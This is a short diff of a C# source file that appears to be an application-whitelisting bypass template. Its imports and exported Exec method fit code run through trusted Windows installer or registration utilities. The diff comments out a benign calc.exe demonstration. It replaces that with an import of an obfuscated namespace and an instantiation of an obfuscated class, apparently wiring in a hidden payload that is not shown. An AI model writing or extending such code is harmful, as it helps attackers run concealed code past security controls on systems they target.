@@ -5,7 +5,7 @@ using System.Configuration.Install;
 using System.Runtime.InteropServices;
 using System.EnterpriseServices;
 using RGiesecke.DllExport;
-
+using xjQqSimmnIFz;
 
 
 /*
@@ -59,9 +59,10 @@ public class Thing0
 {
     public static void Exec()
     {
-        ProcessStartInfo startInfo = new ProcessStartInfo();
-        startInfo.FileName = "calc.exe";
-        Process.Start(startInfo);
+        //ProcessStartInfo startInfo = new ProcessStartInfo();
+        //startInfo.FileName = "calc.exe";
+        //Process.Start(startInfo);
+        YmNiEBzRInKffN y = new YmNiEBzRInKffN();
     }
 }
 
